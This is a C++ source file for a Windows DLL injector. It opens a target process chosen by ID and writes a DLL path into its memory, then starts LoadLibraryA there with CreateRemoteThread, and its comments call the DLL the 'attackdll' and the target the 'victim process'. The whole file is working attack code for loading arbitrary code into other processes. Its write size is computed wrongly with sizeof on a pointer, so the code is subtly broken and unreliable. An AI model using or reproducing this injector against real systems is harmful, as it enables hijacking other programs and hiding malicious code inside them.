#include <iostream>
#include "windows.h"
#include "stdlib.h"

using namespace std;

int main(int argc, char *argv[])
{
	HANDLE prochandle;	//a handle to the process we want to inject our dll into
	HANDLE threadhandle;	//this will be a handle to the remote thread we will create
	HMODULE dllhandle;	//a module handle to the dll we want to inject into a running process
	int procid;	//this will be the process id of the process we want to inject our dll into
	FARPROC loadlibraryaddr;	//the address of the load library function
	void* baseaddr;		// the base address of our arguments to loadlibrary function
	char* attackdll;	//this will be the full filename of our attacking dll

	
	/*
		Parse the arguments
	*/
	if(argc < 2 || argc > 3)
	{
		//cout << "Error, incorrect amount of args" << endl;
		cerr << "Usage: " << argv[0] << "<Target Process ID> [<Path to dll>]" << endl;
		return -1;
	}

	if(argc == 2)
	{
		procid = atoi(argv[1]);	//save the process id
		attackdll = "C:\\Windows\\testdll.dll";	//Default DLL if none is provided.
	}

	else
	{
		procid = atoi(argv[1]);	//save the process id
		attackdll = argv[2]; //save the dll path
	}

	/*
		Begin the dll injection process
		1) get a handle to the process we want to inject our dll into
		2) Get the address of the windows function LoadLibraryA function
		3) Create the arguments structure to pass into our create thread function
		4) Call CreateRemoteThread
	*/

	// 1. Get a handle to our process
	prochandle = OpenProcess
				(
					PROCESS_ALL_ACCESS,		//desired access
					FALSE,					//inherit handle, is this handle inheritable
					procid					//procid of the victim process
				);

	if(prochandle == NULL)
	{
		cerr << "Error, could not get a handle to the process" << endl;
		return -1;
	}

	cout << "Process Handle acquired" << endl;

	//2. Get the address to LoadLibraryA

	//2a. First get a handle to the Kernel32.dll, since this is where LoadLibraryA lives.
	if((dllhandle = GetModuleHandle("Kernel32.dll")) == NULL)
	{
		cerr << "Error, could not get a handle to Kernel32.dll" << endl;
		return -1;
	}
	cout << "Kernel32.dll handle acquired" << endl;

	//2b. Now that we have the handle to Kernel32.dll we just need to get
	//the base address of the LoadLibraryA function
	loadlibraryaddr = GetProcAddress
						(
							dllhandle,	//hmodule
							"LoadLibraryA"	//process name
						);

	if(loadlibraryaddr == NULL)
	{
		cerr << "Error, unable to obtain the address to LoadLibraryA" << endl;
		return -1;
	}
	cout << "Acquired the address to LoadLibraryA" << endl;

	//3. Allocate and fill in the memory we will use for our arguments to 
	// the remote thread
	baseaddr = VirtualAllocEx
				(
					prochandle,	//handle to our process, which address space the mem is allocated in
					NULL,	//address
					256,	//size of allocated memory
					MEM_COMMIT | MEM_RESERVE,	// allocation type
					PAGE_READWRITE		// protections
				);

	if(baseaddr == NULL)
	{
		cerr << "Error, unable to allocate memory" << endl;
		return -1;
	}

	//4. Fill in the memory allocated for our arguments
	if( WriteProcessMemory
			(
				prochandle,	//handle to the process containing our allocated memory
				baseaddr,	//the address of the memory location
				attackdll, //the actual argument characters
				sizeof(attackdll +1), //the size of the argument plus a null byte
				NULL	//number of bytes written
			) == NULL)
	// this would be the condition that we weren't able to write to memory
	{
		cerr << "Error, could not write the arguments into memory" << endl;
		return -1;
	}

	//5. Create a thread inside of our remote process.  We use this to get
	// into the address space of a remote process
	threadhandle = CreateRemoteThread
					(
						prochandle,		//the handle to our remote process
						NULL,			//thread attributes
						0,				//stack size
						(LPTHREAD_START_ROUTINE)loadlibraryaddr,	//start address
						baseaddr,		//the address of our arg stack
						0,			//creation flags
						NULL		//thread id
						);
}